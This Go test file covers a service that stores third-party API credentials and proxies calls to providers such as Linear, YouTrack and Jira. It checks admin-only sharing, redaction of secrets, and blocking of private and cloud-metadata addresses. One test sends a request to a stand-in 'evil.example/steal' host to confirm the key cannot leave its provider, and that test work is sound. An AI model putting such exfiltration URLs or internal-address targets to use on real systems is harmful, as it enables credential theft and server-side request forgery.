package integrations

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"server/internal/platform/secretbox"
	"strings"
	"testing"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"

	"server/internal/organization"
)

type fakeRepo struct {
	items map[uuid.UUID]Connection
}

func newFakeRepo() *fakeRepo { return &fakeRepo{items: map[uuid.UUID]Connection{}} }

func (f *fakeRepo) List(_ context.Context, orgID, userID uuid.UUID) ([]Connection, error) {
	var out []Connection
	for _, c := range f.items {
		if c.OrganizationID == orgID && (c.Shared || c.OwnerUserID == userID) {
			out = append(out, c)
		}
	}
	return out, nil
}

func (f *fakeRepo) Get(_ context.Context, orgID, id uuid.UUID) (*Connection, error) {
	c, ok := f.items[id]
	if !ok || c.OrganizationID != orgID {
		return nil, nil
	}
	return &c, nil
}

func (f *fakeRepo) Save(_ context.Context, c Connection) (Connection, error) {
	for id, existing := range f.items {
		sameSlot := existing.OrganizationID == c.OrganizationID && existing.Provider == c.Provider &&
			existing.Shared == c.Shared && (c.Shared || existing.OwnerUserID == c.OwnerUserID)
		if sameSlot {
			c.ID = id
		}
	}
	f.items[c.ID] = c
	return c, nil
}

func (f *fakeRepo) Delete(_ context.Context, _ uuid.UUID, id uuid.UUID) error {
	delete(f.items, id)
	return nil
}

func (f *fakeRepo) Used(_ context.Context, id uuid.UUID, status string, _ time.Time) error {
	c := f.items[id]
	c.Status = status
	f.items[id] = c
	return nil
}

type fakeRoles map[uuid.UUID]organization.MembershipRole

func (f fakeRoles) MembershipRole(_ context.Context, userID, _ uuid.UUID) (organization.MembershipRole, error) {
	return f[userID], nil
}

var (
	org    = uuid.New()
	admin  = uuid.New()
	member = uuid.New()
)

func newHandler(repo Repository) *Handler {
	h := NewHandler(repo, fakeRoles{admin: organization.RoleAdmin, member: organization.RoleMember}, secretbox.Passphrase("test-passphrase"))
	return h
}

func call(t *testing.T, h *Handler, user uuid.UUID, method, path string, body any) (int, map[string]any) {
	t.Helper()
	router := chi.NewRouter()
	h.RegisterRoutes(router, func(next http.Handler) http.Handler { return next })
	var reader io.Reader
	if body != nil {
		raw, _ := json.Marshal(body)
		reader = bytes.NewReader(raw)
	}
	req := httptest.NewRequest(method, path, reader)
	req = req.WithContext(context.WithValue(req.Context(), "user_id", user.String()))
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	var out map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &out)
	return rec.Code, out
}

func base() string { return "/api/v1/organizations/" + org.String() + "/integrations" }

func TestOnlyAdminsShareAndOnlyShareableServices(t *testing.T) {
	h := newHandler(newFakeRepo())
	sentry := map[string]any{
		"provider": "sentry", "shared": true, "account": "Acme",
		"config": map[string]string{"organization": "acme"}, "secrets": map[string]string{"token": "sntrys_abcdefgh1234"},
	}
	code, out := call(t, h, member, http.MethodPut, base(), sentry)
	if code != http.StatusForbidden {
		t.Fatalf("a member sharing: %d %v", code, out)
	}
	code, out = call(t, h, admin, http.MethodPut, base(), sentry)
	if code != http.StatusOK || out["shared"] != true || out["key_hint"] != "…1234" {
		t.Fatalf("an admin sharing: %d %v", code, out)
	}
	if _, leaked := out["secrets"]; leaked {
		t.Fatal("secrets went back to the app")
	}
	linear := map[string]any{"provider": "linear", "shared": true, "secrets": map[string]string{"api_key": "lin_api_x"}}
	code, out = call(t, h, admin, http.MethodPut, base(), linear)
	if code != http.StatusBadRequest || !strings.Contains(out["error"].(string), "can't be shared") {
		t.Fatalf("sharing a personal key: %d %v", code, out)
	}
}

func TestMembersSeeSharedConnectionsAndTheirOwn(t *testing.T) {
	repo := newFakeRepo()
	h := newHandler(repo)
	call(t, h, admin, http.MethodPut, base(), map[string]any{
		"provider": "notion", "shared": true, "secrets": map[string]string{"token": "ntn_shared"},
	})
	call(t, h, admin, http.MethodPut, base(), map[string]any{
		"provider": "linear", "secrets": map[string]string{"api_key": "lin_api_admin"},
	})
	code, out := call(t, h, member, http.MethodPut, base(), map[string]any{
		"provider": "linear", "secrets": map[string]string{"api_key": "lin_api_member"},
	})
	if code != http.StatusOK {
		t.Fatalf("a member's own: %d %v", code, out)
	}
	_, listed := call(t, h, member, http.MethodGet, base(), nil)
	connections := listed["connections"].([]any)
	if len(connections) != 2 {
		t.Fatalf("member sees the shared one and their own: %v", connections)
	}
	for _, raw := range connections {
		c := raw.(map[string]any)
		if c["provider"] == "notion" && c["can_manage"] != false {
			t.Fatal("a member can't manage the team's connection")
		}
	}
	// Connecting again replaces the slot instead of adding one.
	call(t, h, member, http.MethodPut, base(), map[string]any{
		"provider": "linear", "secrets": map[string]string{"api_key": "lin_api_member2"},
	})
	if len(repo.items) != 3 {
		t.Fatalf("slots: %d", len(repo.items))
	}
}

func TestSomeoneElsesPersonalConnectionIsUntouchable(t *testing.T) {
	repo := newFakeRepo()
	h := newHandler(repo)
	_, saved := call(t, h, admin, http.MethodPut, base(), map[string]any{
		"provider": "linear", "secrets": map[string]string{"api_key": "lin_api_admin"},
	})
	id := saved["id"].(string)
	code, _ := call(t, h, member, http.MethodPost, base()+"/"+id+"/request", Call{Method: "POST", URL: "https://api.linear.app/graphql"})
	if code != http.StatusNotFound {
		t.Fatalf("using another's key: %d", code)
	}
	code, _ = call(t, h, member, http.MethodDelete, base()+"/"+id, nil)
	if code != http.StatusForbidden {
		t.Fatalf("deleting another's key: %d", code)
	}
}

func TestRequestsCarryTheKeyOnlyToTheirService(t *testing.T) {
	var got *http.Request
	service := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		got = r
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"ok":true}`))
	}))
	defer service.Close()

	repo := newFakeRepo()
	h := newHandler(repo)
	// The test server is on this machine, which the real client refuses.
	h.client = service.Client()
	_, saved := call(t, h, member, http.MethodPut, base(), map[string]any{
		"provider": "youtrack", "config": map[string]string{"url": service.URL},
		"secrets": map[string]string{"token": "perm:secret"},
	})
	id := saved["id"].(string)

	body := base64.StdEncoding.EncodeToString([]byte(`{"text":"hi"}`))
	code, out := call(t, h, member, http.MethodPost, base()+"/"+id+"/request", Call{
		Method: "POST", URL: service.URL + "/api/issues/APP-1/comments?fields=id",
		Headers: map[string]string{"Content-Type": "application/json", "Authorization": "Bearer forged", "Cookie": "x"},
		Body:    body,
	})
	if code != http.StatusOK || out["status"].(float64) != 200 {
		t.Fatalf("proxied: %d %v", code, out)
	}
	if got.Header.Get("Authorization") != "Bearer perm:secret" || got.Header.Get("Cookie") != "" {
		t.Fatalf("headers sent: %v", got.Header)
	}
	if got.URL.RawQuery != "fields=id" {
		t.Fatalf("query: %q", got.URL.RawQuery)
	}

	code, out = call(t, h, member, http.MethodPost, base()+"/"+id+"/request", Call{
		Method: "GET", URL: "https://evil.example/steal",
	})
	if code != http.StatusBadRequest || !strings.Contains(out["error"].(string), "isn't youtrack's") {
		t.Fatalf("another host: %d %v", code, out)
	}
	code, _ = call(t, h, member, http.MethodPost, base()+"/"+id+"/request", Call{
		Method: "DELETE", URL: service.URL + "/api/issues/APP-1",
	})
	if code != http.StatusBadRequest {
		t.Fatalf("DELETE: %d", code)
	}
}

func TestTrelloKeysTravelAsQueryParameters(t *testing.T) {
	req, err := build(context.Background(), providers["trello"], Call{
		Method: "GET", URL: "https://api.trello.com/1/cards/abc?fields=name",
	}, map[string]string{"api_key": "k", "token": "t"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	query := req.URL.Query()
	if query.Get("key") != "k" || query.Get("token") != "t" || query.Get("fields") != "name" {
		t.Fatalf("query: %v", query)
	}
	user, password, _ := func() (string, string, bool) {
		r, _ := build(context.Background(), providers["jira"], Call{Method: "GET", URL: "https://acme.atlassian.net/rest/api/3/myself"},
			map[string]string{"token": "tok"}, map[string]string{"url": "https://acme.atlassian.net", "email": "a@b.c"})
		return r.BasicAuth()
	}()
	if user != "a@b.c" || password != "tok" {
		t.Fatalf("jira basic auth: %s %s", user, password)
	}
}

func TestSelfHostedAddressesStayOffPrivateNetworks(t *testing.T) {
	for _, address := range []string{"127.0.0.1", "10.0.0.5", "192.168.1.2", "169.254.169.254", "100.64.0.1", "::1", "fd00::1"} {
		if publicAddress(parseIP(address)) {
			t.Errorf("%s counted as public", address)
		}
	}
	for _, address := range []string{"8.8.8.8", "2606:4700:4700::1111"} {
		if !publicAddress(parseIP(address)) {
			t.Errorf("%s counted as private", address)
		}
	}
	// A path prefix holds: a server installed under /gitlab only.
	_, err := build(context.Background(), providers["gitlab"], Call{Method: "GET", URL: "https://git.acme.dev/gitlabx/api/v4/user"},
		map[string]string{"token": "t"}, map[string]string{"url": "https://git.acme.dev/gitlab"})
	if err == nil {
		t.Fatal("a sibling path was allowed")
	}
}

func TestNothingIsKeptWithoutAnEncryptionKey(t *testing.T) {
	h := NewHandler(newFakeRepo(), fakeRoles{}, nil)
	code, out := call(t, h, member, http.MethodGet, base(), nil)
	if code != http.StatusOK || out["available"] != false {
		t.Fatalf("list: %d %v", code, out)
	}
	code, _ = call(t, h, member, http.MethodPut, base(), map[string]any{
		"provider": "linear", "secrets": map[string]string{"api_key": "x"},
	})
	if code != http.StatusServiceUnavailable {
		t.Fatalf("save: %d", code)
	}
}

func parseIP(address string) net.IP { return net.ParseIP(address) }
